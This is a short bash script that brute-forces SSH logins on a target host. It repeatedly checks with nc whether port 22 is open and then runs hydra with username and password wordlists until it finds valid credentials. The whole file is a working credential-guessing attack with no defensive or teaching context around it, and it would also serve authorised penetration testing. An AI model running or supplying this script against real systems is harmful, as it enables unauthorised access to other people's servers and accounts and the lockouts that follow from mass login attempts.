#!/bin/bash

attack_login=users.txt
attack_password=password.txt
TARGET=$TARGET_IP
attack_protocol=ssh

while true 
do
while true; do nc -zv ${TARGET} 22 > /dev/null && break; done
hydra -fV -L ${attack_login} -P ${attack_password} ${TARGET} ${attack_protocol}
done
